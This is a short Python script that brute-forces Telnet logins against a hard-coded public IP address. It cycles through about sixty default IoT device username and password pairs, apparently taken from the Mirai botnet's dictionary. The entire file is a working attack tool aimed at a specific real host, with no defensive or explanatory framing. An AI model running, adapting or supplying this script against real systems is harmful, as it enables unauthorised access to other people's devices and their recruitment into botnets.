'''
@author: wardog

^ ^
o O
\./

'''

import telnetlib

host = "79.134.59.196"

print("Start bf on : " + host)

loginPasswords = [
("root","xc3511"),
("root","vizxv"),
("root","admin"),
("admin","admin"),
("root","888888"),
("root","xmhdipc"),
("root","default"),
("root","juantech"),
("root","123456"),
("root","54321"),
("support","support"),
("root",""),
("admin","password"),
("root","root"),
("root","12345"),
("user","user"),
("admin",""),
("root","pass"),
("admin","admin1234"),
("root","1111"),
("admin","smcadmin"),
("admin","1111"),
("root","666666"),
("root","password"),
("root","1234"),
("root","klv123"),
("Administrator","admin"),
("service","service"),
("supervisor","supervisor"),
("guest","guest"),
("guest","12345"),
("guest","12345"),
("admin1","password"),
("administrator","1234"),
("666666","666666"),
("888888","888888"),
("ubnt","ubnt"),
("root","klv1234"),
("root","Zte521"),
("root","hi3518"),
("root","jvbzd"),
("root","anko"),
("root","zlxx."),
("root","7ujMko0vizxv"),
("root","7ujMko0admin"),
("root","system"),
("root","ikwb"),
("root","dreambox"),
("root","user"),
("root","realtek"),
("root","00000000"),
("admin","1111111"),
("admin","1234"),
("admin","12345"),
("admin","54321"),
("admin","123456"),
("admin","7ujMko0admin"),
("admin","1234"),
("admin","pass"),
("admin","meinsm"),
("tech","tech"),
("mother","fucker")]

for loginPassword in loginPasswords:

	print("Trying with : " + str(loginPassword))

	tn = telnetlib.Telnet(host)

	tn.read_until(b"login: ")
	tn.write(loginPassword[0].encode('ascii')+ b"\n")

	tn.read_until(b"Password: ")
	tn.write(loginPassword[1].encode('ascii')+ b"\n")

	print(tn.read_until(b"Login incorrect").decode('ascii'))
	